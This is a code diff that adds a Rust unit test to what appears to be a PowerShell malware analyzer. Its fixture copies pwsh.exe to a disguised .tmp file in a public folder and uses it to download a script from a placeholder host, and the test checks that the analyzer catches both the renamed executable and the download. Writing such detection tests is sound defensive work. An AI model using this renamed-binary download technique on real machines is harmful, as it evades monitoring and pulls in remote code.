@@ -12885,6 +12885,36 @@ mod powershell_tests {
             r.deobfuscated
         );
     }
+
+    #[test]
+    fn copied_pwsh_alias_command_is_scanned_as_manipulated_exec() {
+        let script = br#"copy "C:\Program Files\PowerShell\7\pwsh.exe" "C:\Users\Public\ps7.tmp"
+"C:\Users\Public\ps7.tmp" -NoP -Command "iwr https://copied-pwsh.example/p.ps1 -OutFile p.ps1"
+"#;
+        let r = analyze(script, &Config::default());
+
+        assert!(
+            r.traits.iter().any(|t| matches!(
+                t,
+                Trait::ManipulatedExec { target, .. }
+                    if target.eq_ignore_ascii_case(r#"C:\Users\Public\ps7.tmp"#)
+            )),
+            "renamed pwsh invocation was not tied back to copied alias: {:?}\n{}",
+            r.traits,
+            r.deobfuscated
+        );
+        assert!(
+            r.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://copied-pwsh.example/p.ps1"
+                        && dst.as_deref() == Some("p.ps1")
+            )),
+            "renamed pwsh command was not scanned as PowerShell: {:?}\n{}",
+            r.traits,
+            r.deobfuscated
+        );
+    }
 }
 
 #[cfg(test)]
